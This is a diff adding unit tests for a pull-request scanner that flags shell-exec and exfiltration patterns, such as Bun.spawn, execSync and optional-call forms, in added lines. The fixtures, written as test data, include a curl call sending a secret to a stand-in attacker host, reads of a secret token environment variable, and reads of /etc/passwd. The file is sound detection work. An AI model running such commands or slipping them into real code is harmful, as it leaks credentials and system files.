@@ -618,6 +618,76 @@ test('scanTestPatterns: ignores a removed execSync line', () => {
   assert.deepEqual(shellExecPatterns(patch), []);
 });
 
+// ── scanTestPatterns: shell-exec residuals (PEN-6204) ────────────────────────
+//
+// Each pair below is one mechanism: a must-flag fixture and a must-NOT-flag
+// fixture. Each was shown to red under a mutation removing ONLY its own
+// mechanism, so a later edit that drops one cannot stay green on the back of
+// another (the receiver arm, the optional-call form, and the `^` anchor are
+// independent, and `\s`-style overlap between them would make these vacuous).
+
+test('scanTestPatterns: flags Bun.spawn with no child_process in the patch', () => {
+  // The coverage the PEN-6177 narrowing dropped: `Bun` names the mechanism, so
+  // the member arm's `child_process` corroboration never arrives.
+  assert.equal(shellExecPatterns('+  Bun.spawn(["sh", "-c", cmd]);').length, 1);
+  assert.equal(shellExecPatterns('+  Bun.spawnSync(["sh", "-c", cmd]);').length, 1);
+  assert.equal(shellExecPatterns('+  Bun?.spawn(["sh", "-c", cmd]);').length, 1);
+});
+
+test('scanTestPatterns: does not flag a receiver that merely ends in the allowlisted name', () => {
+  // The allowlist is a whole-identifier match, not a substring one -- otherwise
+  // it re-opens the false-positive class PEN-6177 closed.
+  assert.deepEqual(shellExecPatterns('+  myBun.spawn(["ls"]);'), []);
+  assert.deepEqual(shellExecPatterns('+  config.Bun.spawn(["ls"]);'), []);
+});
+
+test('scanTestPatterns: flags the optional-call form, which still invokes', () => {
+  assert.equal(shellExecPatterns(`+  execSync?.('curl ' + url);`).length, 1);
+  assert.equal(shellExecPatterns(`+  Bun.spawn?.(["sh", "-c", cmd]);`).length, 1);
+});
+
+test('scanTestPatterns: does not flag an optional call on a non-shell receiver', () => {
+  // `?.` must not become a way back in for `RegExp.prototype.exec`.
+  assert.deepEqual(shellExecPatterns('+  const m = BLOB_URL.exec?.(url);'), []);
+});
+
+test('scanTestPatterns: ignores a removed line that carries a + earlier on it', () => {
+  // Unanchored, `\+.*` was satisfied by the `+` in `base + suffix` and this
+  // removed line reported as if the PR had added it.
+  assert.deepEqual(shellExecPatterns('-  const cmd = base + suffix; execSync(cmd);'), []);
+  assert.deepEqual(shellExecPatterns('   const cmd = base + suffix; execSync(cmd);'), []);
+});
+
+test('scanTestPatterns: still flags an added line that carries a + earlier on it', () => {
+  // The must-flag half of the anchor: anchoring must not cost a true positive.
+  assert.equal(shellExecPatterns('+  const cmd = base + suffix; execSync(cmd);').length, 1);
+});
+
+test('scanTestPatterns: the anchor applies to every suspicious pattern, not just shell-exec', () => {
+  const removed = (patch) => scanTestPatterns([{ filename: 'src/foo.test.ts', patch }]);
+  assert.deepEqual(removed('-  const u = base + path; await fetch(u);'), []);
+  assert.deepEqual(removed('-  const k = a + b; const t = process.env.SECRET_TOKEN;'), []);
+  assert.deepEqual(removed('-  const p = dir + name; readFileSync("/etc/passwd");'), []);
+});
+
+test('scanTestPatterns: the flag names the matched line', () => {
+  const [flag] = shellExecPatterns(`+  execSync('curl https://attacker.test?data=' + secret)`);
+  assert.equal(flag.line, `+  execSync('curl https://attacker.test?data=' + secret)`);
+});
+
+test('scanTestPatterns: the named line is one the firing arm matched', () => {
+  // An uncorroborated member call sits ABOVE the bare call that actually fired.
+  // Reporting the member line would point the reader at an arm that declined.
+  const patch = ['+  const m = BLOB_URL.exec(url);', `+  execSync('ls');`].join('\n');
+  const [flag] = shellExecPatterns(patch);
+  assert.equal(flag.line, `+  execSync('ls');`);
+});
+
+test('scanTestPatterns: a long matched line is capped', () => {
+  const [flag] = shellExecPatterns(`+  execSync('${'a'.repeat(400)}');`);
+  assert.equal(flag.line.length, 120);
+});
+
 // ── scanSensitivePaths ───────────────────────────────────────────────────────
 
 test('scanSensitivePaths: flags changes to agents route (API key IDOR / cross-tenant)', () => {
